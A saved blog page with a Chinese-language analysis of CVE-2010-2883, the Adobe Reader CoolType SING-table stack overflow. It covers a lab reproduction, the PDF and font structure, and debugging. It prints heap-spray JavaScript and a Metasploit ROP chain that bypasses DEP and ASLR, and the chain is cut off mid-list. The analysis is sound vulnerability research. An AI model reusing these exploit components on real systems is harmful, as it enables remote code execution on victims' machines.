<!DOCTYPE html>
<!-- saved from url=(0037)http://#/archives/150.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="https://lib.baomitu.com/">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>CVE-2010-2883分析 - lZeroyuee's Blog</title>
    <!-- Favicon -->
    <link rel="shortcut icon" href="http://lzeroyuee.cn/usr/uploads/2020/05/1330681747.png">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <!-- AmazeUI 3.0 -->
    <link rel="stylesheet" href="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/amazeui.min.css">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/customui.min.css">
    <!-- CodeHighlight -->
    <style>
    .hljs{display:block;overflow-x:auto;padding:0.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;}.hljs-doctag,.hljs-keyword,.hljs-formula{color:#a626a4}.hljs-section,.hljs-name,.hljs-selector-tag,.hljs-deletion,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-string,.hljs-regexp,.hljs-addition,.hljs-attribute,.hljs-meta-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-variable,.hljs-template-variable,.hljs-type,.hljs-selector-class,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-number{color:#986801}.hljs-symbol,.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:bold}.hljs-link{text-decoration:underline}
    </style>
    <!-- FontAwesome -->
    <link href="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/font-awesome.min.css" rel="stylesheet">
    <!-- 通过自有函数输出HTML头部信息 -->
    <meta name="description" content="CVE-2010-2883漏洞简介Adobe Reader的CoolType.dll库解析字体文件SING表中的uniqueName字段时存在栈溢出，可执行代码，影响Adobe Reader 9...">
<meta name="keywords" content="CVE">
<meta name="generator" content="Typecho 1.2/19.05.09">
<meta name="template" content="amaze">
<link rel="pingback" href="http://#/action/xmlrpc">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://#/action/xmlrpc?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://#/action/xmlrpc?wlw">
<link rel="alternate" type="application/rss+xml" title="CVE-2010-2883分析 » lZeroyuee&#39;s Blog » RSS 2.0" href="http://#/feed/archives/150.html">
<link rel="alternate" type="application/rdf+xml" title="CVE-2010-2883分析 » lZeroyuee&#39;s Blog » RSS 1.0" href="http://#/feed/rss/archives/150.html">
<link rel="alternate" type="application/atom+xml" title="CVE-2010-2883分析 » lZeroyuee&#39;s Blog » ATOM 1.0" href="http://#/feed/atom/archives/150.html">
<script type="text/javascript">
(function () {
    window.TypechoComment = {
        dom : function (id) {
            return document.getElementById(id);
        },
    
        create : function (tag, attr) {
            var el = document.createElement(tag);
        
            for (var key in attr) {
                el.setAttribute(key, attr[key]);
            }
        
            return el;
        },

        reply : function (cid, coid) {
            var comment = this.dom(cid), parent = comment.parentNode,
                response = this.dom('respond-post-150'), input = this.dom('comment-parent'),
                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
                textarea = response.getElementsByTagName('textarea')[0];

            if (null == input) {
                input = this.create('input', {
                    'type' : 'hidden',
                    'name' : 'parent',
                    'id'   : 'comment-parent'
                });

                form.appendChild(input);
            }

            input.setAttribute('value', coid);

            if (null == this.dom('comment-form-place-holder')) {
                var holder = this.create('div', {
                    'id' : 'comment-form-place-holder'
                });

                response.parentNode.insertBefore(holder, response);
            }

            comment.appendChild(response);
            this.dom('cancel-comment-reply-link').style.display = '';

            if (null != textarea && 'text' == textarea.name) {
                textarea.focus();
            }

            return false;
        },

        cancelReply : function () {
            var response = this.dom('respond-post-150'),
            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');

            if (null != input) {
                input.parentNode.removeChild(input);
            }

            if (null == holder) {
                return true;
            }

            this.dom('cancel-comment-reply-link').style.display = 'none';
            holder.parentNode.insertBefore(response, holder);
            return false;
        }
    };
})();
</script>
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
        load: 'onload'
    }, added = false;

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-150'),
            input = document.createElement('input');
        input.type = 'hidden';
        input.name = '_';
        input.value = (function () {
    var _WF40 = 'de'//'nfi'
+//'Mc'
'Mc'+//'2Cr'
'2Cr'+'IcX'//'IcX'
+'46b'//'Bf'
+''///*'zge'*/'zge'
+//'c'
'b9'+//'b'
'1b7'+'373'//'xZq'
+//'XXU'
'dc'+'3'//'p1'
+''///*'rDK'*/'rDK'
+'f'//'f'
+'31c'//'6'
+//'gVf'
'e'+/* 'U'//'U' */''+//'nS'
'a'+'c'//'Nme'
+//'OX'
'12e'+//'N'
'N'+//'XBs'
'9'+/* 'X'//'X' */''+'f43'//'I'
+'8a'//'97a'
+//'OW'
'OW'+//'uL'
'b', _LxL = [[2,4],[2,5],[2,5],[16,17],[25,26],[31,33]];
    
    for (var i = 0; i < _LxL.length; i ++) {
        _WF40 = _WF40.substring(0, _LxL[i][0]) + _WF40.substring(_LxL[i][1]);
    }

    return _WF40;
})();

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                function append() {
                    if (!added) {
                        forms[0].appendChild(input);
                        added = true;
                    }
                }
            
                for (var i = 0; i < event.triggers.length; i ++) {
                    var trigger = event.triggers[i];
                    document[event.add](trigger, append);
                    window[event.add](trigger, append);
                }
            }
        }
    });
})();
</script><link rel="stylesheet" href="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/APlayer.min.css">
<script type="text/javascript" src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/APlayer.min.js.下载"></script>
<script>var meting_api="http://#/action/metingapi?server=:server&type=:type&id=:id&auth=:auth&r=:r";</script></head>

<body id="blog">
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="http://#/">lZeroyuee's Blog</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="http://lzeroyuee.cn/">Home</a>
                    </li>
                                                            <li>
                        <a href="http://lzeroyuee.cn/archives">归档</a>
                    </li>
                                        <li>
                        <a href="http://lzeroyuee.cn/about/">关于我</a>
                    </li>
                                                        </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <header class="intro-header" style="background-image: url(&#39;&#39;)">
    <div class="container">
        <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>CVE-2010-2883分析</h1>
                        <span class="meta">@lzeroyuee &nbsp;October 1, 2020</span>
                        <div class="tags post-tags"><a href="http://#/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;</div>
                    </div>
                </div>
        </div>
    </div>
    </header>

    <!-- content start -->
    <div class="container">
    <div class="am-g am-g-fixed blog-fixed">
        <div class="am-u-lg-12 am-u-sm-12">
            <article class="am-article blog-article-p article-trigger">
                <div id="post-content" class="am-article-bd">
                    <h1 id="directory071553504865927621">CVE-2010-2883</h1><h2 id="directory071553504865927622">漏洞简介</h2><p>Adobe Reader的CoolType.dll库解析字体文件<code>SING</code>表中的<code>uniqueName</code>字段时存在栈溢出，可执行代码，影响Adobe Reader 9.4之前的9.x系列版本和Adobe Reader 8.2.5之前的8.x系列版本</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/1688419741.png" alt="1.png" title="1.png"></p><h2 id="directory071553504865927623">漏洞复现</h2><table class="am-table"><thead><tr><th>环境</th><th>说明</th></tr></thead><tbody><tr><td>Kali LInux</td><td>攻击机，192.168.71.134:23333</td></tr><tr><td>WIndows 7 旗舰版 SP1</td><td>靶机</td></tr><tr><td>Adobe Reader 9.3.4</td><td>漏洞软件，版本号9.3.4</td></tr></tbody></table><p>利用MSF生成exp，并监听192.168.71.134:23333，等待靶机连接</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/3826369555.png" alt="2.png" title="2.png"></p><p>将exp放入靶机中运行，靶机上线</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2238244823.png" alt="3.png" title="3.png"></p><h2 id="directory071553504865927624">漏洞分析</h2><h3 id="directory071553504865927625">PDF格式</h3><p>参考：<a href="https://lazymind.me/2017/10/pdf-structure/">PDF 文档结构</a></p><h4 id="directory071553504865927626">PDF的组成</h4><p>PDF文件由四部分组成：</p><ol><li>Header：头部，PDF文件第一行，用于标识版本信息</li><li><p>Body：主体，由一系列PDF对象组成</p><pre><code class="hljs cpp"><span class="hljs-number">7</span> <span class="hljs-number">0</span> obj        <span class="hljs-comment">// 7 - 对象ID， 0 - 生成号，一般固定</span>
&lt;&lt;
........    <span class="hljs-comment">// 对象内容, 如果其中要引用其他对象，则写成：8 0 R（引用8号对象，R代表引用）</span>
&gt;&gt;
endobj</code></pre></li><li><p>Xref table：交叉引用表，包含指向所有对象的文件偏移的列表</p><pre><code class="hljs cpp">xref
i j        <span class="hljs-comment">// 从i号对象开始，一共j个</span>
nnnnnnnnnn ggggg N eol    <span class="hljs-comment">// n - 对象在文件中的偏移， g - 生成号, N - n/f（使用/空闲）</span>
nnnnnnnnnn ggggg N eol
...</code></pre></li><li>Trailer：包含文件的根节点信息和文件解析的起点信息</li></ol><h4 id="directory071553504865927627">PDF文件的解析流程</h4><ol><li>读取文件末尾Trailer，获得根节点信息</li><li>通过根节点获得所有页面的对象集合</li><li>根据用户转到第几页，解析此页上所有的对象</li><li>通过渲染引擎将页面显示出来</li></ol><p>由于此漏洞是与字体相关，找到在exp中有关字体描述的部分：</p><pre><code class="hljs javascript"><span class="hljs-number">7</span> <span class="hljs-number">0</span> obj
&lt;&lt;
    <span class="hljs-regexp">/Type /</span>Font                        <span class="hljs-comment">// 字体对象</span>
    /Subtype /TrueType                <span class="hljs-comment">// TrueType类型</span>
    /Name /F1
    /BaseFont /Cinema                <span class="hljs-comment">// 基于Cinema字体</span>
    /Widths []
    /FontDescriptor <span class="hljs-number">9</span> <span class="hljs-number">0</span> R            <span class="hljs-comment">// 字体描述，引用了9号对象</span>
    /Encoding /MacRomanEncoding        <span class="hljs-comment">// MacRoman编码</span>
&gt;&gt;
endobj

<span class="hljs-number">9</span> <span class="hljs-number">0</span> obj
&lt;&lt;
    <span class="hljs-regexp">/Type /</span>FontDescriptor            <span class="hljs-comment">// 字体描述对象</span>
    /FontName /Cinema                <span class="hljs-comment">// Cinema字体</span>
    /Flags <span class="hljs-number">131140</span>
    /FontBBox [<span class="hljs-number">-177</span> <span class="hljs-number">-269</span> <span class="hljs-number">1123</span> <span class="hljs-number">866</span>]
    /FontFile2 <span class="hljs-number">10</span> <span class="hljs-number">0</span> R                <span class="hljs-comment">// 字体文件，引用10号对象</span>
&gt;&gt;</code></pre><p>将10号对象dump下来并查看</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2140212391.png" alt="4.png" title="4.png"></p><p>可得到TTF文件，解析其格式，注意：TTF文件以<strong>大端</strong>表示</p><pre><code class="lang-CPP hljs"><span class="hljs-comment">// TTF文件开头是 OffsetTable 结构，后续跟着 EntryTable 结构数组</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OffsetTable</span> {</span>
    ULONG SFNT_Ver;            <span class="hljs-comment">// 版本</span>
    USHORT numTables;        <span class="hljs-comment">// 后续跟着多少个EntryTable</span>
    USHORT searchRange;
    USHORT entrySelector;
    USHORT rangeShift;
}

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EntryTable</span> {</span>
    <span class="hljs-keyword">union</span> Tag {                <span class="hljs-comment">// 4字节的标识符，对于SING表，此值为 SING</span>
        <span class="hljs-keyword">char</span> asChar[<span class="hljs-number">4</span>];
        ULONG asLong
    };
    ULONG checkSum;            <span class="hljs-comment">// 校验和，对于SING表，此值为 0xD9BCC8B5</span>
    ULONG offset;            <span class="hljs-comment">// 偏移，对于SING表，此值为 0x11C</span>
    ULONG length;            <span class="hljs-comment">// 长度，对于SING表，此值为 0x1DDF</span>
}</code></pre><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/468024122.png" alt="5.png" title="5.png"></p><p>根据SING表的数据，可以找到SING真实的数据，在文件偏移0x11C处，SING数据结构如下：</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/4152669792.png" alt="6.png" title="6.png"></p><h3 id="directory071553504865927628">漏洞成因</h3><p>CoolType.dll库对<code>SING</code>表解析中对<code>uniqueName</code>字段长度没做检查，导致栈溢出</p><p>用IDA静态分析，查找<code>SING</code>表的<code>Tag</code>标志，存在如下交叉引用</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/3951321940.png" alt="7.png" title="7.png"></p><p>逐个查看，溢出点存在于<code>sub_803DCF9</code>中，由于在<code>strcat</code>字符串拼接操作时，没有对参数<code>SingTable.uniqueName</code>长度进行检查，可以造成栈溢出</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2078551506.png" alt="8.png" title="8.png"></p><p>动态调试，执行完<code>strcat</code>之后在目标缓冲区下内存访问断点</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/543779063.png" alt="![](.img9.png)" title="![](.img9.png)"></p><p>接着运行，最终会断在<code>0x808B308</code>的<code>call dword ptr [eax]</code>处，反推上方的大<code>jmp</code>不会执行，必然在<code>jnz</code>指令处会执行跳转</p><p>此时观察各寄存器的值，在<code>call</code>之前<code>edi</code>的值未改变，由<code>edi</code>的值计算决定<code>eax</code>的值</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2275953885.png" alt="10.png" title="10.png"></p><p>接着栈回溯，可知如下调用链：</p><pre><code class="hljs ruby">sub_803DCF9
    <span class="hljs-params">|- strcat - 栈溢出
    |</span>- sub_8016BDE
        <span class="hljs-params">|- sub_801BB21
            |</span>- sub_808B116
                <span class="hljs-params">| - 触发执行ShellCode</span></code></pre><p>在sub_808B116中，栈溢出将<code>dword ptr [edi + 0x3c]</code>所指向内存的内容替换了，而导致<code>call dword ptr [eax]</code>正常流程被劫持</p><p>后续单步步入，执行ROP链，流程如下：</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/3442909373.png" alt="11.png" title="11.png"></p><p>堆喷射在PDF对象11号中，引用了12号对象，为JavaScript脚本</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2524868389.png" alt="17.png" title="17.png"></p><p>将其dump下来查看</p><pre><code class="lang-javascript hljs"><span class="hljs-keyword">var</span> payload = <span class="hljs-built_in">unescape</span>( <span class="hljs-string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%
// ... 中间省略 ...
4%u5e4c%u9e69%u5fed%u7ea0%u60b3%u5b47%u1a44%u5c28%udba5%u3920%udba6%u3f4c%u0d9b%u3575%u8dda%u46c2%ub369%ucd63%ue791%uc474'</span> );
<span class="hljs-keyword">var</span> block = <span class="hljs-built_in">unescape</span>( <span class="hljs-string">"%"</span> + <span class="hljs-string">"u"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> + <span class="hljs-string">"%u"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> + <span class="hljs-string">"0"</span> + <span class="hljs-string">"c"</span> );   <span class="hljs-comment">// or al, 0x0c</span>
<span class="hljs-keyword">while</span> (block.length + <span class="hljs-number">20</span> + <span class="hljs-number">8</span> &lt; <span class="hljs-number">65536</span>) 
    block += block;
<span class="hljs-comment">/*
(0x0c0c - 0x24): 
    -0x20 -&gt; 堆块信息
    -0x4 -&gt; payload前4字节是0x41414141
    为了使payload + 0x4刚好落在每个堆块的0x0c0c偏移处
*/</span>
SP = block.substring(<span class="hljs-number">0</span>, (<span class="hljs-number">0x0c0c</span> - <span class="hljs-number">0x24</span>) / <span class="hljs-number">2</span>);     <span class="hljs-comment">// 0 - 5F4</span>
SP += payload;    <span class="hljs-comment">// payload.length = 0x2BC</span>
SP += block;
slackspace = SP.substring(<span class="hljs-number">0</span>, <span class="hljs-number">65536</span> / <span class="hljs-number">2</span>);
<span class="hljs-keyword">while</span>(slackspace.length &lt; <span class="hljs-number">0x80000</span>)
    slackspace += slackspace;
bigblock = slackspace.substring(<span class="hljs-number">0</span>, <span class="hljs-number">0x80000</span> - (<span class="hljs-number">0x1020</span> - <span class="hljs-number">0x08</span>) / <span class="hljs-number">2</span>);    <span class="hljs-comment">// 0 - 7F7F4</span>
<span class="hljs-keyword">var</span> memory = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
<span class="hljs-keyword">for</span> (count = <span class="hljs-number">0</span>; count &lt; <span class="hljs-number">0x1f0</span>; count++)     <span class="hljs-comment">// 分配了0x1f0块大内存</span>
    memory[count] = bigblock + <span class="hljs-string">"s"</span>;</code></pre><p>对每个申请的堆块进行填充，让其偏移<code>0x0c0c</code>的位置刚好被<code>payload + 0x4</code>处覆盖到</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/4095113912.png" alt="20.png" title="20.png"></p><p>进入堆喷射代码，接着执行ROP链</p><pre><code class="hljs javascript">; ....
; ....
; eax = CreateFileA
<span class="hljs-number">4</span>A801F90    <span class="hljs-number">58</span>              pop     eax                              ; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">&amp;KERNEL32.CreateFileA</span>&gt;</span>
4A801F91    C3              retn
; 调用 CreateFileA
4A80B692  - FF20            jmp     dword ptr [eax]                  ; kernel32.CreateFileA</span></code></pre><p>调用<code>CreateFileA</code>创建了文件<strong>iso88591</strong>，访问属性为<code>GENERIC_ALL（0x10000000）</code>，之后返回到<code>icucnv36.4A801064</code></p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/1368143904.png" alt="12.png" title="12.png"></p><p>返回后进入ROP链</p><pre><code class="hljs javascript">; ....
; ....

; eax = CreateFileMappingA
<span class="hljs-number">4</span>A801F90    <span class="hljs-number">58</span>              pop     eax                              ; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">&amp;KERNEL32.CreateFileMappingA</span>&gt;</span>
4A801F91    C3              retn
; 调用 CreateFileMappingA
4A80B692  - FF20            jmp     dword ptr [eax]                  ; kernel32.CreateFileMappingA</span></code></pre><p>创建文件映射对象，访问属性<code>PAGE_EXECUTE_READWRITE（0x40）</code>，大小<code>0x10000</code>，之后返回到<code>icucnv36.4A801064</code></p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2497848099.png" alt="13.png" title="13.png"></p><p>返回后进入ROP链</p><pre><code class="hljs javascript">; ....
; ....

; eax = MapViewOfFile
<span class="hljs-number">4</span>A801F90    <span class="hljs-number">58</span>              pop     eax                              ; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">&amp;KERNEL32.MapViewOfFile</span>&gt;</span>
4A801F91    C3              retn
; 调用 MapViewOfFile
4A80B692  - FF20            jmp     dword ptr [eax]                  ; kernel32.MapViewOfFile</span></code></pre><p>创建映射视图，访问权限<code>FILE_MAP_WRITE | FILE_MAP_EXECUTE (0x22)</code>，大小<code>0x10000</code>，之后返回到<code>icucnv36.4A801064</code></p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/169159044.png" alt="14.png" title="14.png"></p><p>再次进入ROP链</p><pre><code class="hljs cpp">; ....
; ....

; eax = <span class="hljs-built_in">memcpy</span>
<span class="hljs-number">4</span>A801F90    <span class="hljs-number">58</span>              pop     eax                              ; &lt;&amp;MSVCR80.<span class="hljs-built_in">memcpy</span>&gt;
<span class="hljs-number">4</span>A801F91    C3              retn
; 调用 <span class="hljs-built_in">memcpy</span>
<span class="hljs-number">4</span>A80B692  - FF20            jmp     dword ptr [eax]                  ; msvcr80.<span class="hljs-built_in">memcpy</span></code></pre><p>执行<code>memcpy</code>，将源缓冲区数据（ShellCode），拷贝到目标缓冲区中（前面文件映射出的缓冲区），之后返回到目标缓冲区首地址处执行ShellCode，以此绕过DEP</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2064610279.png" alt="15.png" title="15.png"></p><p>同时，ROP链存在于<code>icucnv36.dll</code>库中，此库默认情况下的装载位置不会改变，也就绕过了ASLR</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2794781852.png" alt="16.png" title="16.png"></p><p>最后，MSF的exp如下：</p><pre><code class="lang-ruby hljs">stack_data = [
    <span class="hljs-number">0x41414141</span>,   <span class="hljs-comment"># unused</span>
    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a8a0000</span>,   <span class="hljs-comment"># becomes ecx</span>

    <span class="hljs-number">0x4a802196</span>,   <span class="hljs-comment"># mov [ecx],eax / ret # save whatever eax starts as</span>

    <span class="hljs-number">0x4a801f90</span>,   <span class="hljs-comment"># pop eax / ret</span>
    <span class="hljs-number">0x4a84903c</span>,   <span class="hljs-comment"># becomes eax (import for CreateFileA)</span>

    <span class="hljs-comment"># -- call CreateFileA</span>
    <span class="hljs-number">0x4a80b692</span>,   <span class="hljs-comment"># jmp [eax]</span>

    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># ret</span>

    <span class="hljs-number">0x4a8522c8</span>,   <span class="hljs-comment"># first arg to CreateFileA (lpFileName / pointer to "iso88591")</span>
    <span class="hljs-number">0x10000000</span>,   <span class="hljs-comment"># second arg  - dwDesiredAccess</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># third arg   - dwShareMode</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># fourth arg  - lpSecurityAttributes</span>
    <span class="hljs-number">0x00000002</span>,   <span class="hljs-comment"># fifth arg   - dwCreationDisposition</span>
    <span class="hljs-number">0x00000102</span>,   <span class="hljs-comment"># sixth arg   - dwFlagsAndAttributes</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># seventh arg - hTemplateFile</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># becomes ecx</span>

    <span class="hljs-number">0x4a842db2</span>,   <span class="hljs-comment"># xchg eax,edi / ret</span>

    <span class="hljs-number">0x4a802ab1</span>,   <span class="hljs-comment"># pop ebx / ret</span>
    <span class="hljs-number">0x00000008</span>,   <span class="hljs-comment"># becomes ebx - offset to modify</span>

    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># This points at a neat-o block of code that ... TBD</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment">#   and [esp+ebx*2],edi</span>
    <span class="hljs-comment">#   jne check_slash</span>
    <span class="hljs-comment"># ret_one:</span>
    <span class="hljs-comment">#   mov al,1</span>
    <span class="hljs-comment">#   ret</span>
    <span class="hljs-comment"># check_slash:</span>
    <span class="hljs-comment">#   cmp al,0x2f</span>
    <span class="hljs-comment">#   je ret_one</span>
    <span class="hljs-comment">#   cmp al,0x41</span>
    <span class="hljs-comment">#   jl check_lower</span>
    <span class="hljs-comment">#   cmp al,0x5a</span>
    <span class="hljs-comment">#   jle check_ptr</span>
    <span class="hljs-comment"># check_lower:</span>
    <span class="hljs-comment">#   cmp al,0x61</span>
    <span class="hljs-comment">#   jl ret_zero</span>
    <span class="hljs-comment">#   cmp al,0x7a</span>
    <span class="hljs-comment">#   jg ret_zero</span>
    <span class="hljs-comment">#   cmp [ecx+1],0x3a</span>
    <span class="hljs-comment">#   je ret_one</span>
    <span class="hljs-comment"># ret_zero:</span>
    <span class="hljs-comment">#   xor al,al</span>
    <span class="hljs-comment">#   ret</span>
    <span class="hljs-comment">#</span>

    <span class="hljs-number">0x4a80a8a6</span>,   <span class="hljs-comment"># execute fun block</span>

    <span class="hljs-number">0x4a801f90</span>,   <span class="hljs-comment"># pop eax / ret</span>
    <span class="hljs-number">0x4a849038</span>,   <span class="hljs-comment"># becomes eax (import for CreateFileMappingA)</span>

    <span class="hljs-comment"># -- call CreateFileMappingA</span>
    <span class="hljs-number">0x4a80b692</span>,   <span class="hljs-comment"># jmp [eax]</span>

    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># ret</span>

    <span class="hljs-number">0xffffffff</span>,   <span class="hljs-comment"># arguments to CreateFileMappingA, hFile</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># lpAttributes</span>
    <span class="hljs-number">0x00000040</span>,   <span class="hljs-comment"># flProtect</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># dwMaximumSizeHigh</span>
    <span class="hljs-number">0x00010000</span>,   <span class="hljs-comment"># dwMaximumSizeLow</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># lpName</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># becomes ecx</span>

    <span class="hljs-number">0x4a842db2</span>,   <span class="hljs-comment"># xchg eax,edi / ret</span>

    <span class="hljs-number">0x4a802ab1</span>,   <span class="hljs-comment"># pop ebx / ret</span>
    <span class="hljs-number">0x00000008</span>,   <span class="hljs-comment"># becomes ebx - offset to modify</span>

    <span class="hljs-number">0x4a80a8a6</span>,   <span class="hljs-comment"># execute fun block</span>

    <span class="hljs-number">0x4a801f90</span>,   <span class="hljs-comment"># pop eax / ret</span>
    <span class="hljs-number">0x4a849030</span>,   <span class="hljs-comment"># becomes eax (import for MapViewOfFile</span>

    <span class="hljs-comment"># -- call MapViewOfFile</span>
    <span class="hljs-number">0x4a80b692</span>,   <span class="hljs-comment"># jmp [eax]</span>

    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># ret</span>

    <span class="hljs-number">0xffffffff</span>,   <span class="hljs-comment"># args to MapViewOfFile - hFileMappingObject</span>
    <span class="hljs-number">0x00000022</span>,   <span class="hljs-comment"># dwDesiredAccess</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># dwFileOffsetHigh</span>
    <span class="hljs-number">0x00000000</span>,   <span class="hljs-comment"># dwFileOffsetLow</span>
    <span class="hljs-number">0x00010000</span>,   <span class="hljs-comment"># dwNumberOfBytesToMap</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a8a0004</span>,   <span class="hljs-comment"># becomes ecx - writable pointer</span>

    <span class="hljs-number">0x4a802196</span>,   <span class="hljs-comment"># mov [ecx],eax / ret - save map base addr</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># becomes ecx - ptr to ret</span>

    <span class="hljs-number">0x4a842db2</span>,   <span class="hljs-comment"># xchg eax,edi / ret</span>

    <span class="hljs-number">0x4a802ab1</span>,   <span class="hljs-comment"># pop ebx / ret</span>
    <span class="hljs-number">0x00000030</span>,   <span class="hljs-comment"># becomes ebx - offset to modify</span>

    <span class="hljs-number">0x4a80a8a6</span>,   <span class="hljs-comment"># execute fun block</span>

    <span class="hljs-number">0x4a801f90</span>,   <span class="hljs-comment"># pop eax / ret</span>
    <span class="hljs-number">0x4a8a0004</span>,   <span class="hljs-comment"># becomes eax - saved file mapping ptr</span>

    <span class="hljs-number">0x4a80a7d8</span>,   <span class="hljs-comment"># mov eax,[eax] / ret - load saved mapping ptr</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># becomes ecx - ptr to ret</span>

    <span class="hljs-number">0x4a842db2</span>,   <span class="hljs-comment"># xchg eax,edi / ret</span>

    <span class="hljs-number">0x4a802ab1</span>,   <span class="hljs-comment"># pop ebx / ret</span>
    <span class="hljs-number">0x00000020</span>,   <span class="hljs-comment"># becomes ebx - offset to modify</span>

    <span class="hljs-number">0x4a80a8a6</span>,   <span class="hljs-comment"># execute fun block</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># becomes ecx - ptr to ret</span>

